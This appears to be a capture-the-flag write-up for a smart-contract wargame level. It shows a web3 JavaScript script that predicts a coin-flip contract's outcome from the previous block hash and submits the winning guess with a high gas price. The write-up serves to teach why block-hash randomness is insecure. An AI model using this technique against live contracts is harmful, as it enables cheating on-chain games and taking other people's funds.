To solve this level we need to make the correct guess (0 or 1) 10 times in a row to win. The correct value is determined from the block hash of the previous block. Given that we have a good chance of knowing which block our transaction will be included in, we can look up the hash for the previous block and calculate the expected value.

We can make use of web3 for getting this block information and calculating the correct guess:
```javascript
var abi = [{"constant":true,"inputs":[],"name":"consecutiveWins","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"constant":false,"inputs":[{"name":"_guess","type":"bool"}],"name":"flip","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"}];
var contract = web3.eth.contract(abi).at("0xf7753af1edf59d783a8beaa4dbf99f004385b998")

function run_once() {
    var factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    web3.eth.getBlockNumber(async (err, last_block_number) => {
        console.log("Transaction must be in block " + (last_block_number + 1));
        // Our transaction will hopefully be included in the next block, making this block
        // number be the "last block"
        web3.eth.getBlock(last_block_number, async (err, block) => {
            console.log("Last block hash: " + block.hash);
            let guess = Math.trunc(block.hash / factor);
            console.log("Guess: " + guess);
            // Be generous with gas prices so there's a better chance we get included in the next block
            contract.flip(guess, {from: "0x8E0Ff062059376013FA56470805bec01b5aD06cc", gasPrice: 3000000000000}, ()=>{});
        })
    });
}
```

Now we just call `run_once` 10+ times in a row, waiting each time for the transaction to be mined. If at any point we don't get included in the block we'd hoped for then there's a 50% chance we make the wrong guess which will reset our consecutive wins to 0. Usually we will get the block we want though, proven by the fact that I was able to solve this level in ~15 executions.
